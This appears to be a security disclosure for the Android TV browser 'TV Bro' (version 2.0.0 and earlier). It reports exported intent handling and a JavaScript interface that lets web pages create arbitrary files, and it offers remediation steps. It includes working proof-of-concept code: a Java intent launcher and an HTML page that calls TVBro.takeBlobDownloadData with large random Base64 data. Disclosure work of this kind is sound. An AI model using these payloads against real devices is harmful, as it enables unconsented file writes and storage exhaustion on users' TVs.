
---

## Vulnerability Report: `com.phlox.tvwebbrowser` 'TV Bro' Version <= 2.0.0

### Vulnerability: Arbitrary File Creation & Download via JavaScript Code Injection in WebView

**Severity**: 🔴 High

### Details:

The `com.phlox.tvwebbrowser` application mishandles external intents through WebView, allowing for both Arbitrary Code Execution (ACE) and, more critically, arbitrary file creation and downloads using specially crafted URIs.

The arbitrary file creation and download risk arises from the ability to generate Base64 encoded strings representing any file content. An attacker can craft these strings and instruct the WebView to decode and save them as files on the user's device without their consent.

**Proof of Concept**:

![Proof of Concept](https://github.com/actuator/com.phlox.tvwebbrowser/blob/main/TVBro.gif)

```java
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setComponent(new ComponentName("com.phlox.tvwebbrowser", "com.phlox.tvwebbrowser.activity.main.MainActivity"));
intent.setData(Uri.parse("http://ampulicidae.com")); // any URL
startActivity(intent);
```

**CWE Reference**:
- [CWE-94](https://cwe.mitre.org/data/definitions/94.html): Improper Control of Generation of Code ('Code Injection')
- [CWE-434](https://cwe.mitre.org/data/definitions/434.html): Unrestricted Upload of File with Dangerous Type 

### Remediation Steps:
1. Restrict External Intent Handling: In `AndroidManifest.xml`, set the `exported` attribute for the affected activity to `false`.
2. URI Sanitization: Implement strict validation and sanitation for URIs.
3. Validate Base64 Data: Before allowing any Base64 decoding in WebView, validate the content to ensure it does not contain malicious data.

### Addendum:

The `com.phlox.tvwebbrowser` application exposes a JavaScript interface, TVBro, to its WebView component. This poses several security risks:

- **Resource Exhaustion**: Creating extremely large files using `takeBlobDownloadData` method.
- **Arbitrary File Creation/Downloads**: The most critical vulnerability. Files with any content can be created and downloaded without user consent, just by encoding malicious data in Base64.

**Proof of Concept**:

```html
<!-- Simple HTML code to demonstrate vulnerability -->
<!DOCTYPE html>
<html lang="en">
<head>
    <title>TV Bro Exploit Demo</title>
</head>
<body>
    <button onclick="triggerExploit()">Trigger Exploit</button>
    <div id="status"></div>
    <script>
        function generateRandomBase64String(length) {
            let characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }
        function triggerExploit() {
            const base64Data = generateRandomBase64String(500000);
            const fileName = 'exploit.txt';
            const url = 'http://ampulicidae.com'; 
            const mimeType = 'text/plain';
            if (window.TVBro && typeof window.TVBro.takeBlobDownloadData === 'function') {
                document.getElementById('status').innerText = "Invoking...";
                window.TVBro.takeBlobDownloadData(base64Data, fileName, url, mimeType);
            } else {
                document.getElementById('status').innerText = "Interface not found.";
            }
        }
    </script>
</body>
</html>
```

---

